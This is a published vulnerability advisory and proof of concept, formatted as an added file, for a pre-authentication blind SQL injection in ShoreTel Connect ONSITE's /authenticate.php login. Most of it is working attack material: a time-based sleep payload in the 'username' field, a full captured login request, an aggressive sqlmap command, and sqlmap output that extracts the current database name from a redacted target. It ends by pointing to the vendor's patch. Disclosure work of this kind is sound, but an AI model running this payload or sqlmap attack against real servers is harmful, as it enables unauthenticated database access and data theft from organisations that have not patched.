@@ -1,0 +1,87 @@
+# Exploit Title: ShoreTel Connect ONSITE Blind SQL Injection Vulnerability
+# Date: 19-09-2016
+# Software Link:
+https://www.shoretel.com/resource-center/shoretel-connect-onsite-overview
+# Exploit Author: Iraklis Mathiopoulos
+# Contact: https://twitter.com/_imath_
+# Website: https://medium.com/@iraklis
+# Category: webapps
+
+1. Description
+
+Versions of ShoreTel Connect ONSITE prior and including 21.79.4311.0
+are vulnerable to a Blind SQL Injection in /authenticate.php, on the webserver
+that is running the Conference system.
+
+Specifically, the POST parameter "username" is not sanitised prior to being used
+in SQL Queries. Using test'%20and%20(select*from(select(sleep(35)))a)--%20
+for the username value the server will respond after approximately 35 seconds.
+
+No authentication is needed in order to exploit the vulnerability as the issue
+resides in the pre-authentication realm of the system.
+
+
+2. Proof of Concept
+
+req.burp:
+---
+POST https://[REDACTED].com/authenticate.php HTTP/1.1
+Host: [REDACTED].com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0)
+Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://[REDACTED].com/signin.php?ret=index.php&brand=1&brandUrl=index.php&rand=377311852
+Cookie: PHPSESSID=fd3eb46033541487cce7774b917c655d
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 197
+
+password=cc03e747a6afbbcbf8be7668acfebee5&password64=dGVzdDEyMw%3D%3D&redirect=&redirectOnFail=&ticketAsQuery=1&expiry=43200&flashlogin=&ParticipantCode=&username=test123&vpassword=&SUBMIT1=Sign+In
+- ---
+
+root@kali:~/projects# sqlmap -r req.burp -p username --dbms=mysql
+--technique=T --time-sec=10  --level=5 --risk=3 --current-db
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201607120a89}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+
+[*] starting at 19:59:34
+
+[19:59:34] [INFO] parsing HTTP request from 'req.burp'
+[19:59:34] [INFO] testing connection to the target URL
+[19:59:42] [INFO] checking if the target is protected by some kind of
+WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+- ---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: password=cc03e747a6afbbcbf8be7668acfebee5&password64=dGVzdDEyMw==&redirect=&redirectOnFail=&ticketAsQuery=1&expiry=43200&flashlogin=&ParticipantCode=&username=test123'
+AND (SELECT * FROM (SELECT(SLEEP(10)))Qlhs) AND 'jIev' LIKE
+'jIev&vpassword=&SUBMIT1=Sign In
+- ---
+[19:59:54] [INFO] testing MySQL
+[20:02:25] [INFO] confirming MySQL
+[20:03:12] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+[20:03:12] [INFO] fetching current database
+[20:03:12] [INFO] retrieved: [REDACTED]
+current database:    '[REDACTED]'
+[20:21:10] [INFO] fetched data logged to text files under
+'/root/.sqlmap/output/[REDACTED].com'
+
+[*] shutting down at 20:21:10
+
+3. Solution:
+
+Install the latest version of ShoreTel Connect ONSITE
+https://support.shoretel.com/kb/view.php?id=kA41A000000XgL6SAK
+
+Related ShoreTel security bulletin:
+https://support.shoretel.com/kb/view.php?id=kA41A000000XgL6SAK
